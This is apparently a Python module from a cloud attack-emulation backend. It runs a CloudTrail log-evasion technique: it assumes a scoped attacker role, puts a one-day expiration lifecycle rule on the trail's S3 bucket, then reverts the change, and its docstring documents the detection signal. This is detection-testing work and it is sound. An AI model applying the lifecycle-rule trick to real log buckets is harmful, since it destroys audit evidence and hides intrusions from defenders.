"""
Technique : aws.defense-evasion.cloudtrail-lifecycle-rule
Tactic    : Defense Evasion (T1685.002 - Disable or Modify Tools: Disable or Modify Cloud Log)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/

How the attack works:
  PutBucketLifecycleConfiguration with a 1-day Expiration on every prefix makes
  S3 delete the trail's log objects on its own schedule. The deletions are
  performed by S3, not by the attacker, so DeleteObject-based detections stay
  silent.

Detection signal:
  - s3:PutBucketLifecycle (the CloudTrail eventName for
    PutBucketLifecycleConfiguration) on a bucket that receives CloudTrail logs,
    especially with a short Expiration.

Revert:
  - DeleteBucketLifecycle in a finally block removes the rule before any
    object can expire.

Credential model:
  Option B. The attack assumes the scoped attacker role created by infra/
  instead of acting as the tenant's cross-account role, so IAM bounds what
  it can reach.

Backend contract:
  run(outputs: dict, region: str = "us-east-1") -> None
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import time

import boto3
from botocore.exceptions import ClientError


def _bootstrap_session(outputs: dict, region: str):
    """Session for the attack. In the MayaTrail backend the worker injects the
    tenant's short-lived assumed-role credentials as outputs['_aws_credentials'];
    use them so the attack runs in the tenant account. Falls back to the ambient
    default session for standalone runs."""
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _assume_role_with_retry(sts_client, role_arn, session_name, duration=3600, max_attempts=5):
    """
    AssumeRole with propagation retry.

    A freshly created IAM role and its inline policy take a few seconds to become
    consistent; sts:AssumeRole can return AccessDenied during that window.
    """
    retryable = {"AccessDenied", "InvalidClientTokenId", "AuthFailure"}
    last_exc = None
    for attempt in range(1, max_attempts + 1):
        try:
            return sts_client.assume_role(
                RoleArn=role_arn,
                RoleSessionName=session_name,
                DurationSeconds=duration,
            )
        except ClientError as exc:
            code = exc.response["Error"]["Code"]
            if code in retryable and attempt < max_attempts:
                print(f"  [~] AssumeRole attempt {attempt}/{max_attempts} got {code}, retrying in 5s")
                time.sleep(5)
                last_exc = exc
            else:
                raise
    raise RuntimeError(f"AssumeRole failed after {max_attempts} attempts: {last_exc}")


def _attacker_session(outputs: dict, region: str, session_name: str):
    """
    Build the session the technique runs as.

    The tenant credentials injected by the worker are used only to assume the
    scoped attacker role this emulation's infra creates. The technique's calls
    are then made by that role, so IAM bounds the blast radius rather than the
    correctness of this script.
    """
    role_arn = (outputs or {}).get("attacker_role_arn", "")
    if not role_arn:
        raise RuntimeError("Missing required Pulumi output: attacker_role_arn")

    sts = _bootstrap_session(outputs, region).client("sts")
    creds = _assume_role_with_retry(sts, role_arn, session_name)["Credentials"]
    print(f"  [+] Assumed scoped attacker role: {role_arn}")
    print("  [!] CloudTrail event: sts:AssumeRole")
    return boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"],
        region_name=region,
    )


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}\n  {msg}\n{'=' * 60}")


def _require(outputs: dict, *keys: str) -> list:
    values = [(outputs or {}).get(k, "") for k in keys]
    missing = [k for k, v in zip(keys, values) if not v]
    if missing:
        raise RuntimeError(f"Missing required Pulumi output(s): {', '.join(missing)}")
    return values


DWELL_TIME_S = 30
LIFECYCLE_RULE_ID = "mayatrail-emulation-expire-all"


def run(outputs: dict, region: str = "us-east-1") -> None:
    bucket_name, trail_name = _require(outputs, "bucket_name", "trail_name")

    banner("Step 0 - Assume the scoped attacker role (AssumeRole)")
    session = _attacker_session(outputs, region, "atomic-t1685002-ct-lifecycle")
    s3 = session.client("s3", region_name=region)

    original_rules = None
    try:
        original_rules = s3.get_bucket_lifecycle_configuration(Bucket=bucket_name)["Rules"]
        print(f"  [~] Bucket already has {len(original_rules)} lifecycle rule(s); they are restored in revert")
    except ClientError as exc:
        if exc.response["Error"]["Code"] != "NoSuchLifecycleConfiguration":
            raise
        print(f"  [+] No lifecycle configuration on {bucket_name}")

    try:
        banner("Step 1 - Add a 1-day expiration rule (PutBucketLifecycleConfiguration)")
        s3.put_bucket_lifecycle_configuration(
            Bucket=bucket_name,
            LifecycleConfiguration={"Rules": [{
                "ID": LIFECYCLE_RULE_ID,
                "Status": "Enabled",
                "Filter": {"Prefix": ""},
                "Expiration": {"Days": 1},
                "NoncurrentVersionExpiration": {"NoncurrentDays": 1},
            }]},
        )
        print(f"  [+] Lifecycle rule {LIFECYCLE_RULE_ID} applied to {bucket_name}")
        print("  [!] CloudTrail event: s3:PutBucketLifecycle")
        print(f"  [!] Logs for trail '{trail_name}' would be deleted by S3 within a day.")
        print(f"  [*] Dwelling {DWELL_TIME_S}s")
        time.sleep(DWELL_TIME_S)
    finally:
        if original_rules:
            banner("Revert - Restore the original lifecycle rules (PutBucketLifecycleConfiguration)")
            s3.put_bucket_lifecycle_configuration(Bucket=bucket_name,
                                                  LifecycleConfiguration={"Rules": original_rules})
            print("  [+] Original lifecycle configuration restored")
        else:
            banner("Revert - Remove the lifecycle rule (DeleteBucketLifecycle)")
            s3.delete_bucket_lifecycle(Bucket=bucket_name)
            print("  [+] Lifecycle configuration removed")

    banner("Complete")
    print("CloudTrail events generated: sts:AssumeRole, s3:GetBucketLifecycle, s3:PutBucketLifecycle, "
          "s3:DeleteBucketLifecycle")
